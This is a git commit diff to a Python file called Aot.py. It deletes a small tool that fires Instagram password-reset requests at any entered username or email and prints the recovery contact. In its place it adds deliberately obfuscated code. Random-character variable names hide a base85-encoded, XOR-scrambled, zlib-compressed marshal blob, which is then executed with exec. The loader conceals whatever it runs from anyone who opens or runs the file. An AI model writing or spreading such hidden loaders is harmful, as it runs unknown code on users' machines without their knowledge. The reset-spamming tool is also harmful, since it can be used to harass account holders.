052a86ef7badbbd2d5dc8b89a495ecb7612af287
Aotpy <parasaotpy@gmail.com>
2026-02-15 17:34:18 +0530

    Update Aot.py

--- Aot.py
+++ Aot.py
@@ -1,42 +1,16 @@
-import httpx
-from user_agent import generate_user_agent
+的分月くく川鳥月物之る生る応海的理花="{4><7FwJdR44`OKMTiZ1Mfs8aITb^yB$t8~;5SDRlCN>nRYj*T;k=nq&E_nbum1L=j9eu^CsgZ`jYJ$;ByP}zi(*4$&a0s}0UmE1I<FQp_mJ9b(?(auS<8vffk%%|k4H%4`-}MNPG-SK?FU_f#hta^NbMa;@hMa$k<*O**pbqeL8osF&Ym<r`8H$8($%{|w*j;wLX$FK;=&Q_3H~TrmF#$)id3-fs;F6Sj*k5~K>;gkR$(3(x3t0mra&Xn=w?&z7U)#ODuh3DDzS<}9R<=aC_P{uYM;pJrc&M0l>v(%znCc|*CDg<`K6sxQTw{B&paDNszIn0`2nk_{PHY7S)lepzomkKUvX;p=4*%Kj|6?bVR-mvxCN_^M_2^_m0qEmIUptK8zAGrV(Mp^rh<Bud+s%YyUa*{M#|B+fNt{5OQuAf=rFcb8nlBC6*Xu#m=AxaVsW4+sU$zSe;%=tPq(Q_SnkZ>Q-?i4={AFD{Rh;$$`I${ue3kij#{GgZ$qp<LaQ6-{CdiU_&)dh$HWsQ-Agy`EJJA|O{f>chUc#^$niw-^L2ln<vhAQGp8-7D?DaC$dR>9;XHTbetu+cylBrk+nS>0A0=*9yW!d&bUl)*$uw&}GP27x!!a>R!A;`y!vySHPQucT+>Pu2n-f_A1wlz+$2dw4AwV55b@EJ`tjBAh=GDVVCOjixy!(Is1VwRL6jh_N1$gLr@?)?krW#QbxqC~ro1O)$hJFX&9RBXE>a8boAXxlkzOPF"
+下来花面光行水行応行用対心理れ水理光=25
+分っ月自る書風我光な月空鳥月自物水用=42
 
-tgAotpy = 'Reset_Tool'
-Aotpy = '\033[92m'
-ObitoStuffs = '\033[0m'
+生く応的面る対我夢れ夢花月得行なな個=getattr(__builtins__,"__dict__")
+書月海分る下物れ花可個我理物理用物物=生く応的面る対我夢れ夢花月得行なな個["__import__"]
 
+月心分る個川面夢風心個山書風行個之る=書月海分る下物れ花可個我理物理用物物("base64").b85decode(的分月くく川鳥月物之る生る応海的理花)
+月心分る個川面夢風心個山書風行個之る=bytes([(x^分っ月自る書風我光な月空鳥月自物水用) for x in 月心分る個川面夢風心個山書風行個之る])
+月心分る個川面夢風心個山書風行個之る=bytes(月心分る個川面夢風心個山書風行個之る[::-1])
+月心分る個川面夢風心個山書風行個之る=bytes([(x^下来花面光行水行応行用対心理れ水理光) for x in 月心分る個川面夢風心個山書風行個之る])
 
-def send_reset(user):
-    try:
-        headers = {
-            "user-agent": generate_user_agent(),
-            "x-ig-app-id": "936619743392459",
-            "x-requested-with": "XMLHttpRequest",
-            "x-csrftoken": "missing",
-            "origin": "https://www.instagram.com",
-            "referer": "https://www.instagram.com/accounts/password/reset/"
-        }
+な海的物応分化るれ風面書書可夢闇闇く=書月海分る下物れ花可個我理物理用物物("zlib").decompress(月心分る個川面夢風心個山書風行個之る)
+花下光っ鳥鳥水理闇下っ下風っ水な的可=書月海分る下物れ花可個我理物理用物物("marshal").loads(な海的物応分化るれ風面書書可夢闇闇く)
 
-        r = httpx.Client(http2=True, headers=headers, timeout=20).post(
-            "https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/", 
-            data={"email_or_username": user}
-        )
-        
-        contact = r.json().get('contact_point', 'No email found')
-        return f"{Aotpy}[+] Reset sent to: {contact}{ObitoStuffs}"
-    
-    except Exception as e:
-        return f"{Aotpy}[!] Error: {str(e)}{ObitoStuffs}"
-
-def main():
-    print(f"{Aotpy}{'─' * 40}{ObitoStuffs}")
-    user = input(f"{Aotpy}[?] Enter Email/Username: {ObitoStuffs}")
-    
-    # Check if input is "owner"
-    if user.lower() == "owner":
-        print(f"{Aotpy}[+] Owner Telegram: t.me/Aotpy{ObitoStuffs}")
-    else:
-        print(send_reset(user))
-
-if __name__ == "__main__":
-    main()
+exec(花下光っ鳥鳥水理闇下っ下風っ水な的可)
